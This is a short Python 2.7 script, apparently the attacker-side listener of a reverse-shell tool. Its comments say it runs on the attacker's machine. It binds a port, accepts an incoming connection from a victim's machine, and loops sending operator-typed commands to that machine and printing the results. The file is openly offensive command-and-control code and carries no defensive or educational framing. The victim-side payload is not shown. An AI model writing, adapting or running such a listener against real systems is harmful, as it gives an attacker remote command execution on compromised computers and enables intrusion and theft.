#/usr/bin/env python
### Use python 2.7
### run this file on attacke's machine
import attacker_info, socket

attacker_ip = ""                                         # keep this empty
attacker_port = attacker_info.attacker_port              # get attacker's port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((attacker_ip, attacker_port))                     # receive connection
s.listen(5)                                              # listen at most 5 connections
(conn, addr) = s.accept()

while True:
    command = raw_input(">")                             # send command to victims machine
    conn.send(command)
    if (command == "exit"):
        break
    data = conn.recv(2048)
    print(data)
conn.close()
